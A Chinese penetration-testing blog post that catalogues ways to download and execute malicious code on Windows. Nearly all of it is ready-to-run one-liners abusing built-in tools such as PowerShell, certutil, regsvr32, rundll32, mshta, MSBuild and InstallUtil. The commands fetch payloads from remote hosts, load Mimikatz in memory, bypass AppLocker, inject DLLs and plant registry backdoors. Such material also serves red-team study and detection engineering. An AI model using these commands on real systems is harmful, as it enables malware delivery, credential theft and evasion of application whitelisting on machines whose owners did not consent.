---
layout:     post
title:      "Windows上传并执行恶意代码的N种姿势"
subtitle:   "Tricks Collection"
date:       2017-12-28
author:     "Urahara"
header-img: "img/985b529ed039ca38db9b6fbeddd6dfa7.jpg"
header-mask: 0.3
catalog:    true 
tags: 
    - 渗透测试
    - Windows
    - DLL Injection
    - Backdoor
    - AppLocker ByPass

---

### 简介

在各种钓鱼、挖矿、勒索、组建僵尸网络、基础渗透、后渗透过程当中，攻击者都会通过一些方法去下载执行恶意代码并执行完成攻击操作，比如前段时间通过Office DDE执行powershell的，利用宏执行VBS的，绕过权限限制完成危险命令执行的等等，都需要用到文件下载/上传姿势，一般说按照途径可以分为：

1. 通过HTTP、FTP URL进行传输类
2. 通过UNC进行传输类
3. 通过磁盘写入类

而payload执行则具体可以分为**有文件类**和**无文件类**，具体分的话就是**内存执行、本地缓存、磁盘文件**

通过HTTP下载的对象的本地缓存将是IE本地缓存，在以下位置：

- *C:\Users\<username>\AppData\Local\Microsoft\Windows\Temporary Internet Files*
- *C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\<subdir>*

通过指向WebDAV服务器的UNC路径访问的文件将被保存在WebDAV客户机本地缓存中：

- *C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV*

下面我们会总结一些下载和执行的方法，其中也大量包含一些AppLocker ByPass技术和dll注入技术，部分也可以用于后门创建，大家可以根据不同的环境和场景选择使用，当然我会不断地收集各种姿势来更新本文以求更为全面。

### 下载方法

#### Powershell

powershell是最著名的一种方法了，一般的文件下载命令如下

```powershell
powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://reverse-tcp.xyz/test.exe','C:\test.exe')
powershell (Invoke-WebRequest http://reverse-tcp.xyz/test.jpg -O test.jpg)
```

当然也可以从UVC读取

```powershell
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

#### CScript/WScript

首先就是执行UNC路径下的文件

```powershell
cscript //E:jscript \\webdavserver\folder\payload.txt
```

其次就是通过echo写入vbs脚本，再通过cscript来执行

```powershell
  ● echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open ^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> c:\windows\temp\d.vbs
  ● C:\Users\Administrator>cscript c:\d.vbs http://reverse-tcp.xyz/443.exe c:\443.exe
```

#### Bitsadmin

[bitsadmin](https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx)是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。不支持https、ftp协议

```powershell
bitsadmin /TRANSFER /DOWNLOAD http://download.sysinternals.com/files/PSTools.zip  E:\PSTools.zip
bitsadmin /TRANSFER /DOWNLOAD \\webdavserver\folder\payload.ps1  E:\payload.ps1
bitsadmin /TRANSFER /UPLOAD E:\payload.ps1 \\webdavserver\folder\payload.ps1
```

#### Certutil

Certutil是一个命令行程序，它是作为证书服务的一部分安装的。可以使用Certutil转储并显示证书颁发机构(CA)配置信息、配置证书服务、备份和恢复CA组件，并验证证书、密钥对和证书链。

```powershell
certutil -urlcache -split -f http://reverse-tcp.xyz/payload payload
```

#### debug

Windows debug 是一个系统自带的程序调试工具，他有一个功能可以将十六进制转化为可执行文件，所以我们的思路就是将需要上传的可执行文件转化成hex文件，通过echo命令写入目标系统中，最后通过debug将hex还原成可执行文件，这一部分具体步骤可参考我之前的一篇[文章](http://reverse-tcp.xyz/2017/05/27/Some-Ways-To-Create-An-Interactive-Shell-On-Windows/)

#### FTP

ftp也是一种比较经典的方法，核心就是通过ftp -s:filename.txt去执行filename里边的ftp命令

```powershell
echoopen192.168.1.123 21> ftp.txt
echoftp>> ftp.txt
echobin >> ftp.txt
echoftp>> ftp.txt
echoGET ssss2.exe >> ftp.txt
ftp-s:ftp.txt
```

#### CSC

csc.exe是微软.NET Framework 中的C#编译器，Windows系统中默认包含，可在命令行下将cs文件编译成exe

当然思路还是将cs文件echo写入目标系统

```powershell
echo using System.Net;class WebDL { static void Main(string[] args){System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);}} > c:\windows\temp\dl.cs
```

然后调用csc.exe编译cs文件并执行

```powershell
c:\windows\microsoft.net\framework\v3.5\csc /out:c:\windows\temp\dl.exe c:\windws\temp\dl.cs
c:\windows\temp\dl.exe http://reverse-tcp.xyz/svhost.exe c:\windows\temp\svhost.exe
```

#### JScript

以下就是一个js的downloader，和vbs的一样可以直接echo写入服务器执行

```powershell
varObject = WScript.CreateObject("MSXML2.XMLHTTP");Object.open("GET","http://reverse-tcp.xyz/test.exe",false);Object.send();if(Object.Status == 200){varStream = WScript.CreateObject("ADODB.Stream");Stream.Open();Stream.Type = 1;Stream.Write(Object.ResponseBody);Stream.SaveToFile("E:\\test\\ssss2.exe", 2);Stream.Close();}
```

也可以配合rundll32一句话完成下载

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();Object=new%20ActiveXObject("Microsoft.XMLHTTP");Object.open("GET","http://reverse-tcp.xyz/test.exe",false);Object.send();if(Object.Status==200){Stream=new%20ActiveXObject("ADODB.Stream");Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile("E:\\test\\ssss2.exe",2);Stream.Close();}
```

#### CURL/WGET

Windows本身是没有curl和wget的，但是在一些其他软件当中会集成curl.exe，比如说Cmder当中，如果在渗透过程当中遇到了Cmder，那就完全可以通过curl来完成下载操作。

### 执行方法

#### Powershell

对于某些无文件渗透场景，powershell可以直接加载到内存执行是很常见的

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.c
om/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
powershell -exec bypass -c "iwr https://gist.githubusercontent.com/Urahara3389/d83b6f9cce
df9aa53f70d987360dbc0e/raw/53ad790f87e0fd2c9449d5359358cd251c39297a/calc.ps1|iex"
Get-Content script.ps1 | iex
```

#### SyncAppvPublishingServer

除了powershell.exe外，win10以上系统可以使用SyncAppvPublishingServer.exe来执行powershell

```powershell
SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://reverse-tcp.xyz/script.ps1') | IEX
```

#### Runscripthelper

runscripthelper.exe是在Windows 10 RS3中引入的，它所做的事情是从一个特定的目录读取PowerShell代码并执行这些代码。

```powershell
runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test
```

Links:

- https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc
- http://www.4hou.com/technology/8999.html

####  WMIC

使用wmic创建进程执行程序

```powershell
wmic process call create calc
```

Links:

- https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory

#### Pcalua

 Windows程序兼容性助理(Program Compatibility Assistant)的一个组件，通过-a参数可以直接执行exe或者dll

```powershell
C:\windows\system32\pcalua.exe -a C:\file.lnk 
C:\windows\system32\pcalua.exe -a notepad.exe 
C:\windows\system32\pcalua.exe -a \\server\payload.dll
```

Links：

- http://scz.617.cn/windows/201203151045.txt

#### InstallUtil

InstallUtil是.NET框架的一部分，允许用户通过命令提示快速安装和卸载应用程序

```powershell
x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.exe
```

当然可以结合其他命令使用，比如Certutil

```powershell
certutil -urlcache -split -f http://reverse-tcp.xyz/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

Links:

- https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
- https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
- https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md

#### Regsvcs/Regasm

[*Regsvcs*.exe(.NET 服务安装工具)](http://www.baidu.com/link?url=LFHRhAw_0WiFLLLsGtUuU76QX8dVcoSTNemnWDG-M0aO1bzkPOxXN7R9hJf7H8Z4nU7Vs1szBPOVXixckoa7fK) 、 [*Regasm*.exe(程序集注册工具)](http://www.baidu.com/link?url=mXPdwra2bsMnRy5OfhVIkzJC9bLa7D_qoZFmIFG8oJZNX81nO7BWpgNNGDoks-MpfbmV2k2JIuwgfkejVnF2Sy6Q9DtnhdLoRszgvJhHefi)

```powershell
x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll

x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
```

Links：

- https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
- https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
- https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md

#### Regsvr32

执行本地脚本

```powershell
regsvr32.exe /s /u /i:file.sct scrobj.dll
```

加载远程脚本执行

```powershell
regsvr32.exe /s /u /i:http://reverse-tcp.xyz/file.sct scrobj.dll
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```

Links：

- https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md

#### Rundll32

rundll32就很熟悉了，主要用于在内存中运行dll文件，它们会在应用程序中被使用

```powershell
rundll32 AllTheThings.dll,EntryPoint
rundll32 javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://reverse-tcp.xyz/payload.sct");window.close();
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

Links：

- https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html
- https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
- https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md

#### Winword

利用Office word 的**/l**参数来加载dll文件

```powershell
winword.exe /l dllfile.dll
```

#### Cmstp

通过安装一个VPN配置从Webdav加载DLL，可以参考以下链接

```powershell
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
```

Links：

- https://msitpros.com/?p=3960
- https://www.anquanke.com/post/id/86685

#### InfDefaultInstall

和cmstp一样用于加载dll

```powershell
InfDefaultInstall.exe shady.inf
```

```inf
[Version] 
Signature=$CHICAGO$

[DefaultInstall]
UnregisterDlls = Squiblydoo

[Squiblydoo]
11,,scrobj.dll,2,60,https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/ef22366bfb62a2ddea8c5e321d3ce2f4c95d2a66/Backdoor-Minimalist.sct
```

#### MavInject32

MavInject32.exe是微软应用程序虚拟化的一部分，可以直接完成向某一进程注入代码

```powershell
"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL>
```

#### MSIExec

msiexec是一个可用于从命令行安装或配置产品的Microsoft程序。 如果环境配置不正确，使用.MSI文件可能允许攻击者执行特权升级或绕过AppLocker规则。

```powershell
msiexec /quiet /i cmd.msi 
msiexec /q /i http://192.168.100.3/tmp/cmd.png
```

Links:

- https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/

#### Mshta

Msht具有执行内联脚本的能力，它将下载并执行一个脚本作为有效负载:

```powershell
mshta vbscript:Close(Execute("GetObject(""script:http://reverse-tcp.xyz/payload.sct"")"))
```

mshta接受URL作为一个参数来执行HTA

```powershell
mshta http://reverse-tcp.xyz/payload.hta
mshta \\webdavserver\folder\payload.hta
```

#### FSI

fsi.exe用于在控制台中交互式地运行fcode，或者执行fscript。

```powershell
fsi.exe c:\folder\d.fscript
```

Links:

- https://twitter.com/NickTyrer/status/904273264385589248
- https://github.com/api0cradle/UltimateAppLockerByPassList

#### TE

如果安装了TAEF（Test Authoring and Execution Framework）框架并且位于列入白名单的路径中，则可以使用它。 默认位置是：C:\\ program files(x86)\\Windows Kits\\10\\testing\\Runtimes\\TAEF

```powershell
te.exe bypass.wsc
```

Links:

- https://twitter.com/gN3mes1s/status/927680266390384640
- https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42

#### Atbroker

```powershell
ATBroker.exe /start malware
```

Links:

- http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/

#### Forfiles

一个选择并对文件或文件集执行命令的工具。 此命令可用于批处理。

```powershell
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
```

#### Odbcconf

这个和regsvr32很类似。它可以执行一个显示特定函数的DLL。需要注意的是他不一定需要.dll的后缀名文件。

```powershell
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
odbcconf -f file.rsp
```

#### MSDT

Microsofts Signed Binary Involved

```powershell
Open .diagcab package
```

Links:

- https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/

#### Bginfo

BgInfo是一个Microsoft实用程序，它可以在桌面背景中直接显示计算机的系统信息。

```powershell
bginfo.exe bginfo.bgi /popup /nolicprompt
```

Links：

- https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/
- https://github.com/3gstudent/bgi-creater

#### DNX

 .NET Execution Environment(*DNX*) 是一个SDK 和运行时环境,它包含所有的你需要创建和运行.net应用程序的组件。可以执行C#代码

```powershell
dnx.exe consoleapp
```

Links:

https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/

#### CSI/RCSI

和dnx一样csi和rcsi都可以执行C#代码，但csi是交互式的而rcsi不是。

```powershell
rcs.exe bypass.csx
rcsi.exe bypass.csx
```

Links：

- https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html
- https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/

#### DFSVC

dfsvc.exe是用来检查应用程序是否已经安装并且是最新的，如果需要的话将应用程序下载到用户AppData中的ClickOnce文件夹，然后从当前位置（随着每次更新而改变）启动它。NetSPI团队在之前有分析过利用ClickOnce这种方法在钓鱼当中的利用，但在渗透中还是需要一定的场景。

```
rundll32.exe dfshim.dll,ShOpenVerbApplication http://reverse-tcp.xyz/application/?param1=foo
```

Links:

- http://www.sixdub.net/?p=555

#### MSXSL

根据Microsoft的msxsl.exe命令行程序，用户能够使用Microsoft XSL处理器执行命令行可扩展样式表语言（XSL）。 但是，这个二进制文件可以用来执行恶意的JavaScript代码并绕过应用程序白名单保护。

```powershell
msxsl.exe customers.xml script.xsl
```

Links:

- https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/

#### IEExec

IEExec.exe也是.Net框架中的一个可执行文件，能够通过指定URL来运行托管在远程目标上的应用程序。

```powershell
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\IEExec.exe http://reverse-tcp.xyz/bypass.exe
```

Links:

- https://pentestlab.blog/2017/06/13/applocker-bypass-ieexec/

#### MSBuild

MSBuild，它引入一种新的基于 XML 的项目文件格式，这种格式容易理解、易于扩展并且完全受 Microsoft 支持。MSBuild 项目文件的格式使开发人员能够充分描述哪些项需要生成，以及如何利用不同的平台和配置生成这些项。MSBuild 编译后生成的是.exe

它的利用姿势是相对新颖的，可以参考以下文章

- https://www.anquanke.com/post/id/84597
- https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
- https://github.com/Cn33liz/MSBuildShell

```powershell
C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe File.csproj
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

#### Tracker

Visual studio的一部分。需要1028子文件夹中的TrackerUI.dll，可以开启一个进程并注入dll， 当然也可以直接运行exe文件

```powershell
Tracker.exe /c "C:\Windows\System32\calc.exe"
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe
```

#### Control Panel

通过添加注册表，在控制面板启动时设置好的代码将会被执行。这种方法可以用于bypass AppLocker，当然也可以用来设置后门。

```powershell
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls"
/v pentestlab.cpl /t REG_SZ /d "C:\pentestlab.cpl"
```

Links:

- https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/
- https://www.contextis.com/blog/applocker-bypass-via-registry-key-manipulation

#### Pubprn.vbs

在Windows 7以后系统中，微软有一个名为**PubPrn.vbs**的WSH脚本，其中使用了GetObject()，并且参数可控，可以进行WSH注入攻击

```powershell
C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/api0cradle/fb164762143b1ff4042d9c662171a568/raw/709aff66095b7f60e5d6f456a5e42021a95ca802/test.sct
```

Links:

- https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/

#### slmgr.vbs/winrm.vbs

和Pubprn.vbs类似，不过它需要配合注册表，其中用到CreateObject()实例化 Scripting.Dictionary存在劫持后导致代码执行

```powershell
cscript /b C:\Windows\System32\slmgr.vbs
winrm quickconfig
```

Links:

- https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- https://www.youtube.com/watch?v=3gz1QmiMhss

#### CL_Invocation.ps1

windows自带的诊断工具，可以执行exe文件

```powershell
PS C:\> . C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1
PS C:\> SyncInvoke cmd.exe "/c ipconfig > E:\ip.txt"
```

#### Assembly.Load

[Assembly.load](https://msdn.microsoft.com/en-us/library/system.reflection.assembly.load(v=vs.110).aspx)是.Net Framework中[System.Reflection](https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection?view=netframework-4.7.1) namespace中的一种方法，该方法会有多个重载版本，其中一个就是提供程序集的详细信息，即程序集的标识，包括程序集的名称，版本，区域信息，公有密钥标记,全部都是以一个字符串的形式提供，例如：“MyAssembly,Version=1.0.0.0,culture=zh-CN,PublicKeyToken=47887f89771bc57f”。它可以从内存、本地磁盘或者URL当中调用文件。.NET程序集最初只是读取权限，为了枚举与二进制文件相关联的方法和属性，又将权限更改为执行。所以这种方法只能执行C#编译的程序。

这里使用以下代码进行介绍

```C#
namespace nsfocus
{
    public class test
    {
        public static void exec()
        {
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
            proc.Start();
        }
        static void Main(string[] args)
        {
            exec();
        }
    }
}
```

这样利用Assembly.Load在powershell中直接将文件读取到内存当中，并执行代码当中的shellcode

```powershell
PS C:\> $bytes = [System.IO.File]::ReadAllBytes(".\nsfocus.exe")
PS C:\> [Reflection.Assembly]::Load($bytes)
PS C:\> [nsfocus.test]::exec()
```

另外在windows自带的诊断工具中有一个CL_LoadAssembly.ps1文件其中也用到了该方法，同样可以用上述方法来执行C#的程序，步骤如下

```powershell
PS C:\> # powershell -v 2 -ep bypass
PS C:\> cd C:\windows\diagnostics\system\AERO
PS C:\windows\diagnostics\system\AERO> import-module .\CL_LoadAssembly.ps1
PS C:\windows\diagnostics\system\AERO> LoadAssemblyFromPath ..\..\..\..\nsfocus.exe
PS C:\windows\diagnostics\system\AERO> [nsfocus.test]::exec()
```

需要注意利用CL_LoadAssembly.ps1时，它只能执行通过.NET 2.0编译完成的程序，并且执行过程中它会调用同目录下的CL_Utility.ps1脚本，因此脚本执行必须在当前目录(C:\windows\diagnostics\system\AERO)下，另外加载的可执行程序路径也只能该路径的相对路径。

Links:

- https://pentestlab.blog/tag/assembly-load/
- https://holdmybeersecurity.com/2016/09/11/c-to-windows-meterpreter-in-10mins/

### 参考

- 乌云drops 三好学生《渗透技巧——通过cmd上传文件的N种方法 - WooYun知识库》
- https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/amp/